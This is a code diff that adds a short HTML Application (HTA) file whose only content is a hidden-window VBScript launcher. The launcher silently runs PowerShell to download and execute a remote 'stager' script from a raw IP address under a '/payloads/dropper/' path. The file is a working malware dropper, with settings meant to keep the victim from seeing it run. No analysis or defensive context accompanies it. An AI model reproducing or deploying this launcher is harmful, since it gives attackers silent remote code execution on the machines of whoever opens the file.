@@ -1,0 +1,11 @@
+<html>
+    <head>
+        <hta:application icon="" caption="no" windowState="minimize" showInTaskBar="no" sysMenu="no" border="none" scroll="no" navigable="no" />
+        <script type="text/vbscript">
+            window.resizeTo 0,0
+            CreateObject("Wscript.Shell").Run "powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://20.232.12.130:3391/payloads/dropper/stager.ps1'))",0,true
+        </script>
+    </head>
+    <body>
+    </body>
+</html>
